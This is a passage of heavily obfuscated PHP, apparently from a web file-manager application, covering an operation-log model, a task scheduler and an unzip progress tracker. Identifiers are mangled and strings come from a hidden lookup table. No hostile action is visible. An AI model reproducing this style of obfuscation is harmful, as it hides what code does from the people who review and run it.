$ËÔ¥şì’[2569] => LNG($ËÔ¥şì’[2570]), $ËÔ¥şì’[2571] => LNG($ËÔ¥şì’[2572]), $ËÔ¥şì’[2150] => LNG($ËÔ¥şì’[2573]), $ËÔ¥şì’[2151] => LNG($ËÔ¥şì’[2574]), $ËÔ¥şì’[2575] => LNG($ËÔ¥şì’[2576]), $ËÔ¥şì’[2577] => LNG($ËÔ¥şì’[2578]), $ËÔ¥şì’[2579] => LNG($ËÔ¥şì’[2580]), $ËÔ¥şì’[2146] => LNG($ËÔ¥şì’[2581]), $ËÔ¥şì’[2582] => LNG($ËÔ¥şì’[2583]), $ËÔ¥şì’[2145] => LNG($ËÔ¥şì’[2584]), $ËÔ¥şì’[2585] => LNG($ËÔ¥şì’[2585]), $ËÔ¥şì’[2586] => LNG($ËÔ¥şì’[2587]), $ËÔ¥şì’[2588] => LNG($ËÔ¥şì’[2585]), $ËÔ¥şì’[2589] => LNG($ËÔ¥şì’[2590]), $ËÔ¥şì’[2591] => LNG($ËÔ¥şì’[2592]), $ËÔ¥şì’[2593] => LNG($ËÔ¥şì’[2592]), $ËÔ¥şì’[2594] => LNG($ËÔ¥şì’[2595]), $ËÔ¥şì’[2596] => LNG($ËÔ¥şì’[2596]), $ËÔ¥şì’[2597] => LNG($ËÔ¥şì’[2120]), $ËÔ¥şì’[2598] => LNG($ËÔ¥şì’[2599]), $ËÔ¥şì’[2600] => LNG($ËÔ¥şì’[2601]), $ËÔ¥şì’[2602] => LNG($ËÔ¥şì’[2603]), $ËÔ¥şì’[2604] => LNG($ËÔ¥şì’[2605]), $ËÔ¥şì’[2606] => LNG($ËÔ¥şì’[2607]), $ËÔ¥şì’[2608] => LNG($ËÔ¥şì’[2608]), $ËÔ¥şì’[2609] => LNG($ËÔ¥şì’[2610]), $ËÔ¥şì’[2611] => LNG($ËÔ¥şì’[2612]), $ËÔ¥şì’[2613] => LNG($ËÔ¥şì’[2614]), $ËÔ¥şì’[2615] => LNG($ËÔ¥şì’[2616]), $ËÔ¥şì’[2617] => LNG($ËÔ¥şì’[2618]), $ËÔ¥şì’[2619] => LNG($ËÔ¥şì’[2620]), $ËÔ¥şì’[210] => LNG($ËÔ¥şì’[210]), $ËÔ¥şì’[211] => LNG($ËÔ¥şì’[2621]), $ËÔ¥şì’[2622] => LNG($ËÔ¥şì’[2622])); } private function typeFile() { $‘Ò¹š¬ˆ =& $_SERVER[¹Éµ„ºå]; $œ÷†—Á = array($‘Ò¹š¬ˆ[2148] => array($‘Ò¹š¬ˆ[2149]), $‘Ò¹š¬ˆ[2557] => array($‘Ò¹š¬ˆ[2623]), $‘Ò¹š¬ˆ[2559] => array($‘Ò¹š¬ˆ[2624]), $‘Ò¹š¬ˆ[2141] => array($‘Ò¹š¬ˆ[2142], $‘Ò¹š¬ˆ[2625]), $‘Ò¹š¬ˆ[2567] => array(), $‘Ò¹š¬ˆ[2569] => array(), $‘Ò¹š¬ˆ[2571] => array(), $‘Ò¹š¬ˆ[2150] => array($‘Ò¹š¬ˆ[2152]), $‘Ò¹š¬ˆ[2151] => array($‘Ò¹š¬ˆ[2152]), $‘Ò¹š¬ˆ[2575] => array($‘Ò¹š¬ˆ[2626]), $‘Ò¹š¬ˆ[2577] => array($‘Ò¹š¬ˆ[2626]), $‘Ò¹š¬ˆ[2579] => array($‘Ò¹š¬ˆ[2627]), $‘Ò¹š¬ˆ[2565] => array($‘Ò¹š¬ˆ[2628]), $‘Ò¹š¬ˆ[2146] => array($‘Ò¹š¬ˆ[2629]), $‘Ò¹š¬ˆ[2582] => array($‘Ò¹š¬ˆ[2630]), $‘Ò¹š¬ˆ[2145] => array($‘Ò¹š¬ˆ[2147])); return $œ÷†—Á; } private function typeAll() { $ÃÙœ¹÷ =& $_SERVER[¹Éµ„ºå]; $‰€äÌÑ = $this->typeList; $Ä½ıÄöí = array_filter($this->typeFile()); foreach ($Ä½ıÄöí as $ÜßÑæµÖ => $‡Ñ¼œ£ü) { $‰€äÌÑ[$‡Ñ¼œ£ü[0]] = $‰€äÌÑ[$ÜßÑæµÖ]; } $‰€äÌÑ[$ÃÙœ¹÷[2152]] = LNG($ÃÙœ¹÷[2631]); $‰€äÌÑ[$ÃÙœ¹÷[2626]] = LNG($ÃÙœ¹÷[2632]); return $‰€äÌÑ; } public function addLog($êŠ£Å…Å, $¹³Ù°¡™ = array()) { $…•—é¹Ï =& $_SERVER[¹Éµ„ºå]; if (!isset($this->typeList[$êŠ£Å…Å])) { return; } $å«şŸëµ = Session::get($…•—é¹Ï[2310]); if (!$å«şŸëµ) { $å«şŸëµ = _get($¹³Ù°¡™, $…•—é¹Ï[1582], 0); } if ($êŠ£Å…Å == $…•—é¹Ï[2598] && is_array($¹³Ù°¡™[$…•—é¹Ï[2633]]) && !$¹³Ù°¡™[$…•—é¹Ï[2633]]) { return; } $Ş””ÍÔş = get_client_ip(); if (!$¹³Ù°¡™ || strlen(json_encode($¹³Ù°¡™)) >= 1024 * 64) { if ($¹³Ù°¡™ && is_array($¹³Ù°¡™)) { $¹³Ù°¡™ = array_intersect_key($¹³Ù°¡™, array_flip($…•—é¹Ï[487], $…•—é¹Ï[32])); $¹³Ù°¡™[$…•—é¹Ï[1598]] = $Ş””ÍÔş; } else { $¹³Ù°¡™ = array($…•—é¹Ï[1598] => $Ş””ÍÔş); } } else { if (is_array($¹³Ù°¡™)) { $¹³Ù°¡™[$…•—é¹Ï[1598]] = $Ş””ÍÔş; } else { $¹³Ù°¡™ = array($…•—é¹Ï[1381] => $¹³Ù°¡™, $…•—é¹Ï[1598] => $Ş””ÍÔş); } } $¹³Ù°¡™[$…•—é¹Ï[2634]] = ACTION; $¹³Ù°¡™ = array($…•—é¹Ï[1955] => Session::sign(), $…•—é¹Ï[1956] => intval($å«şŸëµ), $…•—é¹Ï[33] => $êŠ£Å…Å, $…•—é¹Ï[1958] => json_encode($¹³Ù°¡™)); Hook::trigger($…•—é¹Ï[2635], $¹³Ù°¡™); return parent::add($¹³Ù°¡™); } public function remove($”·’ã·) { $this->where(array($_SERVER[¹Éµ„ºå][508] => $”·’ã·))->delete(); } private function _makeOrder($™‹ÃŸéİ = '') { $­èßïø— =& $_SERVER[¹Éµ„ºå]; $¦•Ñö…â = $­èßïø—[231]; $ã‘²©®Í = array($­èßïø—[537] => $­èßïø—[538], $­èßïø—[539] => $­èßïø—[540]); $£Ó¼Ë´ = Input::get($­èßïø—[545], $­èßïø—[7], $­èßïø—[2347], array($­èßïø—[2266], $­èßïø—[539])); $£Ó¼Ë´ = $ã‘²©®Í[$£Ó¼Ë´]; $™‹ÃŸéİ = $™‹ÃŸéİ . "{$¦•Ñö…â}\40{$£Ó¼Ë´}"; return $this->order($™‹ÃŸéİ); } public function get($œ°Ãø·™ = '') { $ú×äú„½ =& $_SERVER[¹Éµ„ºå]; if (!$œ°Ãø·™) { show_json(array()); } $ŒéÌ¬®Â = array(); if ($œ°Ãø·™[$ú×äú„½[1582]]) { $ŒéÌ¬®Â[$ú×äú„½[1582]] = $œ°Ãø·™[$ú×äú„½[1582]]; } if (isset($œ°Ãø·™[$ú×äú„½[852]])) { $Ïµ“ªÉË = $œ°Ãø·™[$ú×äú„½[852]]; $³é…” = isset($œ°Ãø·™[$ú×äú„½[853]]) ? $œ°Ãø·™[$ú×äú„½[853]] : time(); $ŒéÌ¬®Â[$ú×äú„½[231]] = array($ú×äú„½[408], array($Ïµ“ªÉË, $³é…”)); } if ($œ°Ãø·™[$ú×äú„½[33]]) { $Îñ‰É¤ƒ = explode($ú×äú„½[50], $œ°Ãø·™[$ú×äú„½[33]]); $şß¢ûØ = $this->typeFile(); $½ÅÑµ—Œ = array(); foreach ($Îñ‰É¤ƒ as $Ö±¿Ãòñ) { $½ÅÑµ—Œ[] = $Ö±¿Ãòñ; if (isset($şß¢ûØ[$Ö±¿Ãòñ])) { $½ÅÑµ—Œ = array_merge($½ÅÑµ—Œ, $şß¢ûØ[$Ö±¿Ãòñ]); } } $½ÅÑµ—Œ = array_unique($½ÅÑµ—Œ); if ($½ÅÑµ—Œ) { $ŒéÌ¬®Â[$ú×äú„½[33]] = array($ú×äú„½[7], $½ÅÑµ—Œ); } } else { $ŒéÌ¬®Â[$ú×äú„½[33]] = array($ú×äú„½[2636], $ú×äú„½[2637]); } if (!empty($œ°Ãø·™[$ú×äú„½[1598]])) { $ŒéÌ¬®Â[$ú×äú„½[540]] = array($ú×äú„½[473], "\x25{$œ°Ãø·™[$ú×äú„½[1598]]}\x25"); } $” âƒï = $this->_makeOrder()->where($ŒéÌ¬®Â)->selectPage(); if (empty($” âƒï[$ú×äú„½[446]])) { show_json(array(), !0, $” âƒï[$ú×äú„½[443]]); } $” âƒï[$ú×äú„½[446]] = $this->logList($” âƒï[$ú×äú„½[446]]); return $” âƒï; } private function ipAddress(&$¿ŒÃş‰ú) { $“Ø’ëÏ =& $_SERVER[¹Éµ„ºå]; if (!empty($¿ŒÃş‰ú[$“Ø’ëÏ[1598]])) { $÷‘¢êÊ© = IpLocation::get($¿ŒÃş‰ú[$“Ø’ëÏ[1598]]); } else { $÷‘¢êÊ© = LNG($“Ø’ëÏ[2638]); } $¿ŒÃş‰ú[$“Ø’ëÏ[2639]] = $÷‘¢êÊ©; } private function descZipDownload($„‡ñƒÄÈ, &$Òâòè°À) { $ÁŞõËÔ« =& $_SERVER[¹Éµ„ºå]; if (!isset($„‡ñƒÄÈ[$ÁŞõËÔ«[1605]])) { return; } $ÀÆ¥ÉŸ– = json_decode($„‡ñƒÄÈ[$ÁŞõËÔ«[1605]], !0); foreach ($ÀÆ¥ÉŸ– as $ûÒ¨­Îï) { try { $Åéúé‡ı = IO::infoFullSimple($ûÒ¨­Îï[$ÁŞõËÔ«[87]]); } catch (Exception $®ıåõÌ©) { continue; } $„‡ñƒÄÈ[$ÁŞõËÔ«[87]] = $ûÒ¨­Îï[$ÁŞõËÔ«[87]]; $Òâòè°À[] = $„‡ñƒÄÈ[$ÁŞõËÔ«[191]] = $Åéúé‡ı[$ÁŞõËÔ«[191]]; $Òâòè°À[] = $„‡ñƒÄÈ[$ÁŞõËÔ«[2407]] = $Åéúé‡ı[$ÁŞõËÔ«[190]]; break; } return $„‡ñƒÄÈ; } private function getSourceList(&$÷’Ïİ—„) { $ºÑ£ºï =& $_SERVER[¹Éµ„ºå]; $ØºµõØª = array(); foreach ($÷’Ïİ—„ as $Ş• ñü => $àç‹Şã) { $Êíõ¢æĞ = json_decode($àç‹Şã[$ºÑ£ºï[540]], !0); if ($àç‹Şã[$ºÑ£ºï[33]] == $ºÑ£ºï[2144]) { $Êíõ¢æĞ = $this->descZipDownload($Êíõ¢æĞ, $ØºµõØª); $÷’Ïİ—„[$Ş• ñü][$ºÑ£ºï[540]] = json_encode($Êíõ¢æĞ); continue; } if (strpos($àç‹Şã[$ºÑ£ºï[33]], $ºÑ£ºï[2409]) !== 0) { if (!isset($Êíõ¢æĞ[$ºÑ£ºï[87]]) || strpos($àç‹Şã[$ºÑ£ºï[33]], $ºÑ£ºï[2640]) !== 0) { continue; } try { $øÓº»éÂ = IO::infoFullSimple($Êíõ¢æĞ[$ºÑ£ºï[87]]); } catch (Exception $ÁÕç•—) { continue; } $ØºµõØª[] = $Êíõ¢æĞ[$ºÑ£ºï[191]] = $øÓº»éÂ[$ºÑ£ºï[191]]; $ØºµõØª[] = $Êíõ¢æĞ[$ºÑ£ºï[2407]] = $øÓº»éÂ[$ºÑ£ºï[190]]; $÷’Ïİ—„[$Ş• ñü][$ºÑ£ºï[540]] = json_encode($Êíõ¢æĞ); continue; } $ØºµõØª[] = $Êíõ¢æĞ[$ºÑ£ºï[191]]; $ØºµõØª[] = $Êíõ¢æĞ[$ºÑ£ºï[2407]]; if ($Êíõ¢æĞ[$ºÑ£ºï[33]] == $ºÑ£ºï[643]) { $ØºµõØª[] = $Êíõ¢æĞ[$ºÑ£ºï[540]][$ºÑ£ºï[1335]]; $ØºµõØª[] = $Êíõ¢æĞ[$ºÑ£ºï[540]][$ºÑ£ºï[1336]]; } if ($Êíõ¢æĞ[$ºÑ£ºï[33]] == $ºÑ£ºï[2417]) { $ØºµõØª[] = $Êíõ¢æĞ[$ºÑ£ºï[540]][$ºÑ£ºï[191]]; } } if (!$ØºµõØª) { return array(); } return Model($ºÑ£ºï[924])->sourceListInfo($ØºµõØª, !0); } private function logList($ÒÓµË•ø) { $–ªÏÜÊï =& $_SERVER[¹Éµ„ºå]; $¾‡¾Š÷ = array_to_keyvalue($ÒÓµË•ø, $–ªÏÜÊï[12], $–ªÏÜÊï[1582]); $‹ÑËê«¿ = Model($–ªÏÜÊï[617])->userListInfo(array_unique($¾‡¾Š÷)); $„­ƒ‹‚› = $this->getSourceList($ÒÓµË•ø); $³º¤ªßÌ = $this->typeAll(); $…²Å¢Ö™ = array(); $»»§®÷¢ = array(); foreach ($ÒÓµË•ø as $«İâ˜ª– => $ÔšÅáÌ) { $Ì¶¹ğÀ = $ÔšÅáÌ[$–ªÏÜÊï[33]]; $óúâ®Â = isset($‹ÑËê«¿[$ÔšÅáÌ[$–ªÏÜÊï[1582]]]) ? $‹ÑËê«¿[$ÔšÅáÌ[$–ªÏÜÊï[1582]]] : !1; $ñ±°–‘° = strpos($Ì¶¹ğÀ, $–ªÏÜÊï[2641]) === 0 ? LNG($–ªÏÜÊï[2642]) : LNG($–ªÏÜÊï[2638]); $ÔšÅáÌ[$–ªÏÜÊï[32]] = isset($óúâ®Â[$–ªÏÜÊï[32]]) ? $óúâ®Â[$–ªÏÜÊï[32]] : LNG($–ªÏÜÊï[2638]); $ÔšÅáÌ[$–ªÏÜÊï[2464]] = isset($óúâ®Â[$–ªÏÜÊï[2464]]) ? $óúâ®Â[$–ªÏÜÊï[2464]] : $–ªÏÜÊï[12]; $ÔšÅáÌ[$–ªÏÜÊï[1854]] = isset($³º¤ªßÌ[$Ì¶¹ğÀ]) ? $³º¤ªßÌ[$Ì¶¹ğÀ] : $ñ±°–‘°; $ÔšÅáÌ[$–ªÏÜÊï[2346]] = $óúâ®Â; $¸Ïç—¦Ë = json_decode($ÔšÅáÌ[$–ªÏÜÊï[540]], !0); $ÔšÅáÌ[$–ªÏÜÊï[1598]] = isset($¸Ïç—¦Ë[$–ªÏÜÊï[1598]]) ? $¸Ïç—¦Ë[$–ªÏÜÊï[1598]] : $–ªÏÜÊï[12]; $ÔšÅáÌ[$–ªÏÜÊï[2639]] = IpLocation::get($ÔšÅáÌ[$–ªÏÜÊï[1598]]); if (strpos($Ì¶¹ğÀ, $–ªÏÜÊï[2409]) === 0 || isset($¸Ïç—¦Ë[$–ªÏÜÊï[2407]])) { $¸Ïç—¦Ë[$–ªÏÜÊï[90]] = $„­ƒ‹‚›[$¸Ïç—¦Ë[$–ªÏÜÊï[191]]]; $¸Ïç—¦Ë[$–ªÏÜÊï[2422]] = $„­ƒ‹‚›[$¸Ïç—¦Ë[$–ªÏÜÊï[2407]]]; if ($¸Ïç—¦Ë[$–ªÏÜÊï[33]] == $–ªÏÜÊï[643]) { $¸Ïç—¦Ë[$–ªÏÜÊï[540]][$–ªÏÜÊï[1335]] = $„­ƒ‹‚›[$¸Ïç—¦Ë[$–ªÏÜÊï[540]][$–ªÏÜÊï[1335]]]; $¸Ïç—¦Ë[$–ªÏÜÊï[540]][$–ªÏÜÊï[1336]] = $„­ƒ‹‚›[$¸Ïç—¦Ë[$–ªÏÜÊï[540]][$–ªÏÜÊï[1336]]]; } if ($¸Ïç—¦Ë[$–ªÏÜÊï[33]] == $–ªÏÜÊï[2417]) { $¸Ïç—¦Ë[$–ªÏÜÊï[540]][$–ªÏÜÊï[191]] = $„­ƒ‹‚›[$¸Ïç—¦Ë[$–ªÏÜÊï[540]][$–ªÏÜÊï[191]]]; } if ($¸Ïç—¦Ë[$–ªÏÜÊï[33]] == $–ªÏÜÊï[1323]) { $¸Ïç—¦Ë[$–ªÏÜÊï[2422]] = $¸Ïç—¦Ë[$–ªÏÜÊï[90]]; $¸Ïç—¦Ë[$–ªÏÜÊï[2407]] = $¸Ïç—¦Ë[$–ªÏÜÊï[2422]][$–ªÏÜÊï[191]]; $¸Ïç—¦Ë[$–ªÏÜÊï[90]] = !1; $¸Ïç—¦Ë[$–ªÏÜÊï[191]] = $–ªÏÜÊï[12]; } $Èç°¨Şš = array($–ªÏÜÊï[1323], $–ªÏÜÊï[2405]); if (!in_array($¸Ïç—¦Ë[$–ªÏÜÊï[33]], $Èç°¨Şš)) { if ($¸Ïç—¦Ë[$–ªÏÜÊï[90]] && $¸Ïç—¦Ë[$–ªÏÜÊï[90]][$–ªÏÜÊï[188]] == $–ªÏÜÊï[189]) { $»»§®÷¢[] = $ÔšÅáÌ[$–ªÏÜÊï[487]]; unset($ÒÓµË•ø[$«İâ˜ª–]); continue; } if ($¸Ïç—¦Ë[$–ªÏÜÊï[2422]] && $¸Ïç—¦Ë[$–ªÏÜÊï[2422]][$–ªÏÜÊï[188]] == $–ªÏÜÊï[189]) { $»»§®÷¢[] = $ÔšÅáÌ[$–ªÏÜÊï[487]]; unset($ÒÓµË•ø[$«İâ˜ª–]); continue; } } } $ÔšÅáÌ[$–ªÏÜÊï[540]] = $¸Ïç—¦Ë; unset($ÔšÅáÌ[$–ªÏÜÊï[2643]]); $…²Å¢Ö™[] = $ÔšÅáÌ; } $this->clearSystemPathLog($»»§®÷¢); return $…²Å¢Ö™; } private function clearSystemPathLog($ª£…€â©) { $ƒè—€û =& $_SERVER[¹Éµ„ºå]; if (count($ª£…€â©) == 0) { return; } $òçç·”† = array($ƒè—€û[487] => array($ƒè—€û[7], array_unique($ª£…€â©))); $this->where($òçç·”†)->delete(); } public function deviceList($ĞÖ’±İ, $‘Ì¢ìå = 0) { $øÖê«¤ø =& $_SERVER[¹Éµ„ºå]; $éÂÉ­Ó = array($øÖê«¤ø[1582] => $ĞÖ’±İ, $øÖê«¤ø[231] => array($øÖê«¤ø[1171], $‘Ì¢ìå), $øÖê«¤ø[33] => $øÖê«¤ø[2116]); $é©Ê› = array(); $Â„ËáŸÀ = $this->field($øÖê«¤ø[2644])->where($éÂÉ­Ó)->order($øÖê«¤ø[2420])->limit(50)->select(); foreach ($Â„ËáŸÀ as $±ÃÁŠ”· => $ıÃŠ©›) { if ($±ÃÁŠ”· > 0 && abs($ıÃŠ©›[$øÖê«¤ø[231]] - $Â„ËáŸÀ[$±ÃÁŠ”· - 1][$øÖê«¤ø[231]]) < 5) { continue; } $ò–ôµ„ = json_decode($ıÃŠ©›[$øÖê«¤ø[540]], !0); $ıÃŠ©›[$øÖê«¤ø[1598]] = isset($ò–ôµ„[$øÖê«¤ø[1598]]) ? $ò–ôµ„[$øÖê«¤ø[1598]] : $øÖê«¤ø[12]; unset($ò–ôµ„[$øÖê«¤ø[1598]]); $ÙÆŒˆñü = $this->deviceType($ò–ôµ„[$øÖê«¤ø[2410]]); if (isset($é©Ê›[$ÙÆŒˆñü])) { continue; } $ıÃŠ©›[$øÖê«¤ø[2639]] = IpLocation::get($ıÃŠ©›[$øÖê«¤ø[1598]]); $ıÃŠ©›[$øÖê«¤ø[540]] = $ò–ôµ„; $é©Ê›[$ÙÆŒˆñü] = $ıÃŠ©›; } return array_values($é©Ê›); } public function deviceType($àõø•Ñ) { return $àõø•Ñ; } } goto d¯Ğ¨ƒ”Œ¿; CÂ¼©œª…‚: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($´Ø©šÔĞ, $’²§„´¢ = 5.0) { if (!$´Ø©šÔĞ) { return; } $è‘Ö¡– = Cache::get($´Ø©šÔĞ); if (!$è‘Ö¡– || timeFloat() - floatVal($è‘Ö¡–) >= $’²§„´¢) { Cache::set($´Ø©šÔĞ, timeFloat(), $’²§„´¢ * 10); return !0; } return !1; } public static function timeLimitCall($¡†õà²¼, $Ñ Ç‚¢å, $Ş€Ğ§–, $ÃØá¨å = 5.0) { $ñİò¶å =& $_SERVER[¹Éµ„ºå]; if (!$¡†õà²¼ || !$Ñ Ç‚¢å) { return; } self::$asyncAdd = !0; $áõÖ‹ôü = $ñİò¶å[2080]; $Šæ»¡Á± = Cache::get($áõÖ‹ôü, !0); $í¸’éä = array($ñİò¶å[2081] => timeFloat(), $ñİò¶å[2082] => timeFloat(), $ñİò¶å[342] => $Ñ Ç‚¢å, $ñİò¶å[2072] => $Ş€Ğ§–, $ñİò¶å[2083] => $ÃØá¨å); if (is_array($Šæ»¡Á±[$¡†õà²¼])) { if (timeFloat() - $Šæ»¡Á±[$¡†õà²¼][$ñİò¶å[2081]] <= $í¸’éä[$ñİò¶å[2083]] * 0.5) { return; } $í¸’éä[$ñİò¶å[2082]] = $Šæ»¡Á±[$¡†õà²¼][$ñİò¶å[2082]]; } $Šæ»¡Á±[$¡†õà²¼] = $í¸’éä; Cache::set($áõÖ‹ôü, $Šæ»¡Á±, 60); Cache::removeMemory($áõÖ‹ôü); write_log($ñİò¶å[2084] . $¡†õà²¼ . $ñİò¶å[74] . $Ñ Ç‚¢å . $ñİò¶å[2085] . ACTION, $ñİò¶å[195]); } public static function timeLimitCallLoop() { $Œ¼ìà® =& $_SERVER[¹Éµ„ºå]; $Ó›°âãä = array($Œ¼ìà®[2086]); $À±¥çïş = in_array(strtolower(ACTION), $Ó›°âãä); if (!$À±¥çïş && !self::$asyncAdd) { return; } $ÖÉùÛ¢÷ = $Œ¼ìà®[2080]; $´ÏåƒØ = Cache::get($ÖÉùÛ¢÷, !0); if (!$´ÏåƒØ || count($´ÏåƒØ) <= 0) { return; } $¨§š†úÎ = timeFloat(); $·‚¢ë È = array(); $ÚÅÕ æ = array(); foreach ($´ÏåƒØ as $û‹’¸û¼ => $Ì×Î€§) { if ($¨§š†úÎ - $Ì×Î€§[$Œ¼ìà®[2082]] > $Ì×Î€§[$Œ¼ìà®[2083]]) { $ÚÅÕ æ[$û‹’¸û¼] = $Ì×Î€§; continue; } $·‚¢ë È[$û‹’¸û¼] = $Ì×Î€§; } if (count($ÚÅÕ æ) == 0) { return; } if (count($·‚¢ë È) == 0) { Cache::remove($ÖÉùÛ¢÷); } else { Cache::set($ÖÉùÛ¢÷, $·‚¢ë È, 60); } Cache::removeMemory($ÖÉùÛ¢÷); self::runArr($ÚÅÕ æ); } public static function finished($óç»¤Û, $İˆ¼€±Ù) { $ïĞ¯£‘ =& $_SERVER[¹Éµ„ºå]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ïĞ¯£‘[342] => $óç»¤Û, $ïĞ¯£‘[2072] => $İˆ¼€±Ù); } private static function runArr($·ÑÆŸ¸) { $ÍÃÓ¢Ê½ =& $_SERVER[¹Éµ„ºå]; if (!$·ÑÆŸ¸) { return; } foreach ($·ÑÆŸ¸ as $Á“×Æ¬“ => $½˜·û´³) { try { Hook::apply($½˜·û´³[$ÍÃÓ¢Ê½[342]], $½˜·û´³[$ÍÃÓ¢Ê½[2072]]); write_log($ÍÃÓ¢Ê½[2087] . $Á“×Æ¬“ . $ÍÃÓ¢Ê½[74] . $½˜·û´³[$ÍÃÓ¢Ê½[342]] . $ÍÃÓ¢Ê½[2085] . ACTION, $ÍÃÓ¢Ê½[195]); } catch (Exception $‹’´¥ë³) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $µÑó‰Üå =& $_SERVER[¹Éµ„ºå]; parent::startAfter(); Hook::bind($µÑó‰Üå[2088], array($this, $µÑó‰Üå[2089])); Hook::bind($µÑó‰Üå[1373], array($this, $µÑó‰Üå[2090])); Hook::bind($µÑó‰Üå[2091], array($this, $µÑó‰Üå[2092])); $Ò¸²µ± =& $this->task; $Ò¸²µ±[$µÑó‰Üå[2093]] = $µÑó‰Üå[1374]; if (!$Ò¸²µ±[$µÑó‰Üå[1854]]) { $Ò¸²µ±[$µÑó‰Üå[1854]] = LNG($µÑó‰Üå[2094]); } } protected function endAfter() { $ê ¹¬½÷ =& $_SERVER[¹Éµ„ºå]; parent::endAfter(); Hook::unbind($ê ¹¬½÷[2088], array($this, $ê ¹¬½÷[2089])); Hook::unbind($ê ¹¬½÷[1373], array($this, $ê ¹¬½÷[2090])); Hook::unbind($ê ¹¬½÷[2091], array($this, $ê ¹¬½÷[2092])); } public function updateAfter() { $ùÓÊŠ’¤ =& $_SERVER[¹Éµ„ºå]; $äŸª Çğ =& $this->task; if (!$äŸª Çğ[$ùÓÊŠ’¤[1221]] || !$äŸª Çğ[$ùÓÊŠ’¤[855]]) { if ($äŸª Çğ[$ùÓÊŠ’¤[2093]] != $ùÓÊŠ’¤[388]) { return; } } if ($äŸª Çğ[$ùÓÊŠ’¤[2093]] == $ùÓÊŠ’¤[1374]) { $Õà¾›©× = 0; if ($äŸª Çğ[$ùÓÊŠ’¤[2018]]) { $Õà¾›©× = $äŸª Çğ[$ùÓÊŠ’¤[2019]] / $äŸª Çğ[$ùÓÊŠ’¤[2018]]; } $äŸª Çğ[$ùÓÊŠ’¤[1966]] = $Õà¾›©× * 0.3; } else { if ($äŸª Çğ[$ùÓÊŠ’¤[2093]] == $ùÓÊŠ’¤[388]) { $Õà¾›©× = $äŸª Çğ[$ùÓÊŠ’¤[1965]] / $äŸª Çğ[$ùÓÊŠ’¤[1221]]; $äŸª Çğ[$ùÓÊŠ’¤[1966]] = 0.3 + $Õà¾›©× * 0.4; } else { if ($äŸª Çğ[$ùÓÊŠ’¤[2093]] == $ùÓÊŠ’¤[107]) { $ŸÎµŒ½ = 0; if ($äŸª Çğ[$ùÓÊŠ’¤[2020]] == $ùÓÊŠ’¤[107]) { $ŸÎµŒ½ = $äŸª Çğ[$ùÓÊŠ’¤[2019]]; } $Õà¾›©× = ($äŸª Çğ[$ùÓÊŠ’¤[932]] + $ŸÎµŒ½) / $äŸª Çğ[$ùÓÊŠ’¤[855]]; $äŸª Çğ[$ùÓÊŠ’¤[1966]] = 0.3 + 0.4 + $Õà¾›©× * 0.3; } } } if ($äŸª Çğ[$ùÓÊŠ’¤[1966]] > 0) { $°®–Áµ³ = timeFloat() - $äŸª Çğ[$ùÓÊŠ’¤[1968]] - $äŸª Çğ[$ùÓÊŠ’¤[1971]]; $äŸª Çğ[$ùÓÊŠ’¤[1972]] = $°®–Áµ³ * (1 - $äŸª Çğ[$ùÓÊŠ’¤[1966]]) / $äŸª Çğ[$ùÓÊŠ’¤[1966]]; } } public function addFile($å€ºëÉ§) { $ÆŞ¿ğØ =& $_SERVER[¹Éµ„ºå]; $·ÕÄ˜Œ =& $this->task; $Ùğåæ®™ = IO::info($å€ºëÉ§); $·ÕÄ˜Œ[$ÆŞ¿ğØ[2016]] = $Ùğåæ®™[$ÆŞ¿ğØ[32]]; $·ÕÄ˜Œ[$ÆŞ¿ğØ[2018]] = $Ùğåæ®™[$ÆŞ¿ğØ[79]]; $·ÕÄ˜Œ[$ÆŞ¿ğØ[2019]] = 0; $·ÕÄ˜Œ[$ÆŞ¿ğØ[1223]] = $ÆŞ¿ğØ[2046]; $·ÕÄ˜Œ[$ÆŞ¿ğØ[2020]] = $ÆŞ¿ğØ[1374]; $·ÕÄ˜Œ[$ÆŞ¿ğØ[855]] = $Ùğåæ®™[$ÆŞ¿ğØ[79]]; $·ÕÄ˜Œ[$ÆŞ¿ğØ[1221]] = 1; $ØîÀä–¡ = 0; $·ÕÄ˜Œ[$ÆŞ¿ğØ[2028]] = array($ÆŞ¿ğØ[2029] => $ØîÀä–¡ + 1, $ÆŞ¿ğØ[509] => $Ùğåæ®™[$ÆŞ¿ğØ[32]], $ÆŞ¿ğØ[87] => $Ùğåæ®™[$ÆŞ¿ğØ[87]], $ÆŞ¿ğØ[602] => $Ùğåæ®™[$ÆŞ¿ğØ[602]] ? $Ùğåæ®™[$ÆŞ¿ğØ[602]] : $Ùğåæ®™[$ÆŞ¿ğØ[87]]); $this->update(); } public function zipEvent($ƒíËªçÚ, $ùÙŒ†éê, $ø¬…¥Œ£, $»èóà¡ö) { $ŒƒŠî­ =& $_SERVER[¹Éµ„ºå]; $§Ÿ¢î©ú =& $this->task; $§Ÿ¢î©ú[$ŒƒŠî­[2016]] = get_path_this($ùÙŒ†éê); $§Ÿ¢î©ú[$ŒƒŠî­[2018]] = $»èóà¡ö; $§Ÿ¢î©ú[$ŒƒŠî­[2019]] = $ø¬…¥Œ£; $§Ÿ¢î©ú[$ŒƒŠî­[1223]] = $ƒíËªçÚ == $ŒƒŠî­[2095] ? $ŒƒŠî­[2096] : $ŒƒŠî­[2097]; $§Ÿ¢î©ú[$ŒƒŠî­[2020]] = $ŒƒŠî­[12]; $§Ÿ¢î©ú[$ŒƒŠî­[855]] = $»èóà¡ö; $§Ÿ¢î©ú[$ŒƒŠî­[2093]] = $ŒƒŠî­[388]; $this->update(); } public function unzipAfter($•ä©®ğö) { $ê…ºÉÕ =& $_SERVER[¹Éµ„ºå]; $Ï£¶›ë =& $this->task; $Ï£¶›ë[$ê…ºÉÕ[2093]] = $ê…ºÉÕ[107]; $æ±¥ß¦œ = IO::infoWithChildren($•ä©®ğö); $ÅÌ²Ô¥ = 0; $Ï£¶›ë[$ê…ºÉÕ[2028]] = array($ê…ºÉÕ[2029] => $ÅÌ²Ô¥ + 1, $ê…ºÉÕ[509] => $æ±¥ß¦œ[$ê…ºÉÕ[32]], $ê…ºÉÕ[87] => $æ±¥ß¦œ[$ê…ºÉÕ[87]], $ê…ºÉÕ[602] => $æ±¥ß¦œ[$ê…ºÉÕ[602]] ? $æ±¥ß¦œ[$ê…ºÉÕ[602]] : $æ±¥ß¦œ[$ê…ºÉÕ[87]]); if ($æ±¥ß¦œ[$ê…ºÉÕ[33]] == $ê…ºÉÕ[230]) { $Ï£¶›ë[$ê…ºÉÕ[1221]] = 